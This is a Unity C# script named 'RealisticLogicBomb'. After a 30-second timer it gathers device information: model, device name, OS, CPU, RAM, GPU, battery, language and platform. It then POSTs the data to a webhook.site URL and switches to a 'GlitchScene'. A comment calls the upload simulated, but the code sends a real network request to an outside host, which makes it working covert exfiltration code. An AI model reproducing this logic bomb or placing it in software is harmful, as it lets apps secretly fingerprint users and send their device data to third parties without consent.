using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;
using System.Collections;

public class RealisticLogicBomb : MonoBehaviour
{
    private float timer = 0f;
    public float triggerTime = 30f;
    private bool triggered = false;

    void Update()
    {
        timer += Time.deltaTime;

        if (timer >= triggerTime && !triggered)
        {
            triggered = true;
            StartCoroutine(ExecuteLogicBomb());
        }
    }

    IEnumerator ExecuteLogicBomb()
    {
        // Basic system info
        string model = SystemInfo.deviceModel;
        string deviceName = SystemInfo.deviceName;
        string deviceType = SystemInfo.deviceType.ToString();
        string os = SystemInfo.operatingSystem;
        string osFamily = SystemInfo.operatingSystemFamily.ToString();

        string cpuType = SystemInfo.processorType;
        int cpuCores = SystemInfo.processorCount;
        int cpuFreq = SystemInfo.processorFrequency;

        int ram = SystemInfo.systemMemorySize;

        string gpu = SystemInfo.graphicsDeviceName;
        string gpuVendor = SystemInfo.graphicsDeviceVendor;
        int gpuRam = SystemInfo.graphicsMemorySize;

        float battery = SystemInfo.batteryLevel * 100f;
        string batteryStatus = SystemInfo.batteryStatus.ToString();

        string language = Application.systemLanguage.ToString();
        string unityVersion = Application.unityVersion;
        string platform = Application.platform.ToString();

        string timestamp = System.DateTime.Now.ToString();

        // Print logs to console
        Debug.Log("=== Logic Bomb Triggered ===");
        Debug.Log("Time: " + timestamp);
        Debug.Log("Device: " + model + " (" + deviceType + ")");
        Debug.Log("OS: " + os + " (" + osFamily + ")");
        Debug.Log("CPU: " + cpuType + " | Cores: " + cpuCores + " | Freq: " + cpuFreq + "MHz");
        Debug.Log("RAM: " + ram + " MB");
        Debug.Log("GPU: " + gpu + " (" + gpuVendor + ") | VRAM: " + gpuRam + " MB");
        Debug.Log("Battery: " + battery.ToString("F0") + "% (" + batteryStatus + ")");
        Debug.Log("Language: " + language);
        Debug.Log("Unity Version: " + unityVersion);
        Debug.Log("Platform: " + platform);

        // Simulate sending data
        WWWForm form = new WWWForm();
        form.AddField("device", model);
        form.AddField("deviceName", deviceName);
        form.AddField("deviceType", deviceType);
        form.AddField("os", os);
        form.AddField("osFamily", osFamily);
        form.AddField("cpuType", cpuType);
        form.AddField("cpuCores", cpuCores);
        form.AddField("cpuFreq", cpuFreq);
        form.AddField("ram", ram);
        form.AddField("gpu", gpu);
        form.AddField("gpuVendor", gpuVendor);
        form.AddField("gpuRam", gpuRam);
        form.AddField("battery", battery.ToString("F0"));
        form.AddField("batteryStatus", batteryStatus);
        form.AddField("language", language);
        form.AddField("unityVersion", unityVersion);
        form.AddField("platform", platform);
        form.AddField("timestamp", timestamp);

        using (UnityWebRequest www = UnityWebRequest.Post("https://webhook.site/fa86962c-a4df-4f7f-8a93-52ad03b6d91a", form))
        {
            yield return www.SendWebRequest();
            Debug.Log("Data sent");
        }

        // Switch scene
        SceneManager.LoadScene("GlitchScene");
    }
}
